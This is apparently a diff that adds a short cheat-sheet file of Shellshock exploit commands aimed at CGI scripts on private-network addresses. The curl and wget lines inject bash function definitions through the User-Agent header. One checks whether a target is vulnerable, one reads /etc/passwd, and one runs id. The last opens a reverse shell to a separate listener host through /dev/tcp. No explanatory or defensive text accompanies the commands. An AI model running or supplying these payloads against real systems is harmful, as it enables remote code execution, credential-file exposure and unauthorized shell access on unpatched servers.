@@ -1,0 +1,7 @@
+wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.10.10.129/cgi-bin/status
+
+curl -A "() { :; }; echo 'Content-type: text/html'; echo; /bin/bash -c 'cat /etc/passwd' " http://192.168.130.203:591/cgi-bin/cat
+
+curl -A "() { :; }; echo 'Content-type: text/html'; echo; /usr/bin/id;" http://192.168.57.101:591/cgi-bin/cat
+
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.0.101/1234 0>&1' http://192.168.0.102/cgi-bin/status
